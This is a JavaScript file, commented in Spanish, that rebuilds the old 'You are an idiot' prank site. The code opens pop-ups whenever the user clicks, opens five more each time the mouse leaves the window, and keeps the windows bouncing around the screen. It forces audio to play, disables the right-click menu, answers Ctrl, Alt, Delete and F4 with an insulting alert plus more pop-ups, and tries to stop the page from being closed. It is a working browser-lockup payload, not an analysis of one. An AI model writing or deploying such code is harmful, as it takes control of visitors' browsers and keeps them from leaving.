/* [Nov 2026] Versión Final You.js - Clic Instantáneo + OnMouseOut Siempre Activo */
window.addEventListener('load', function () {
    iniciarControlSonido();
    flagRun = 1;
    playBall();
});

// Detecta si la ventana actual es la principal o un pop-up flotante
var esVentanaPrincipal = window.location.pathname.indexOf('lol.html') === -1;

function iniciarControlSonido() {
    var micon = document.getElementById('youare-micon');
    if (micon) {
        micon.addEventListener('click', musicPlay);
    }

    // DISPARO POR CLIC EN CUALQUIER PARTE DE LA PANTALLA:
    document.addEventListener('click', function(event) {
        // Si hace clic en el altavoz o en los enlaces (about, legacy, safe), no dispara los pop-ups
        if (event.target && (event.target.id === 'youare-micon' || event.target.closest('a'))) {
            return;
        }

        // Activa el sonido automáticamente en la ventana principal al hacer clic
        var audio = document.getElementById('youare-audio');
        if (audio && (audio.muted || audio.paused)) {
            audio.muted = false;
            audio.play().catch(function(e) { console.log(e); });
            if (micon) micon.src = "images/speaker.png";
        }

        // Abre inmediatamente el pop-up al hacer clic
        openWindow('lol.html');
    });
    
    if (esVentanaPrincipal) {
        var audio = document.getElementById('youare-audio');
        if (audio) {
            audio.muted = true;
            if (micon) micon.src = "images/speakerm.png";
        }
    } else {
        forzarAudioAuto();
    }
}

function forzarAudioAuto() {
    var audio = document.getElementById('youare-audio');
    if (audio) {
        audio.muted = false;
        audio.play().catch(function(error) {
            console.log("Esperando foco de pantalla para activar el audio del pop-up...");
        });
    }
}

window.addEventListener('focus', function() {
    if (!esVentanaPrincipal) {
        var audio = document.getElementById('youare-audio');
        if (audio && (audio.paused || audio.muted)) {
            audio.muted = false;
            audio.play().catch(function(e) { console.log(e); });
        }
    }
});

function musicPlay(event) {
    if (event) {
        event.stopPropagation();
    }

    var audio = document.getElementById('youare-audio');
    var micon = document.getElementById('youare-micon');
    
    if (audio) {
        if (!audio.muted && !audio.paused) {
            audio.pause();             
            audio.currentTime = 0;     
            audio.muted = true;        
            if (micon) micon.src = "images/speakerm.png"; 
        } else {
            audio.muted = false;
            audio.currentTime = 0;     
            audio.play().catch(function(error) {
                console.log("Error al intentar reproducir el audio: ", error);
            });
            if (micon) micon.src = "images/speaker.png"; 
        }
    }
}

var xOff = 5;
var yOff = 5;
var xPos = Math.floor(Math.random() * Math.max(0, screen.width - 357));
var yPos = Math.floor(Math.random() * Math.max(0, screen.height - 330));
var flagRun = 1;

function changeTitle(title) {
    document.title = title;
}

function openWindow(url) {
    window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function proCreate() {    
    for (var i = 0; i < 5; i++) {
        openWindow('lol.html');
    }
}

function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; }
function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; }

function fOff() { flagRun = 0; }

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
    if (xPos > screen.width - 357) newXlt();    
    if (xPos < 0) newXrt();
    
    if (yPos > screen.height - 330) newYup();         
    if (yPos < 0) newYdn();
    
    if (flagRun == 1) {
        window.moveTo(xPos, yPos);
        setTimeout(playBall, 1);
    }
}

// Siempre activado como en el comportamiento clásico
window.onmouseout = function () {
    proCreate();
    return null;
};

window.oncontextmenu = function() {
    return false;
};

window.onkeydown = function(event) {    
    var keyCode = event.keyCode || event.which;
    
    if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {    
        alert("You are an idiot!");
        proCreate();
    }
    return null;
};

window.onbeforeunload = function() {
    return "Idiot";
};
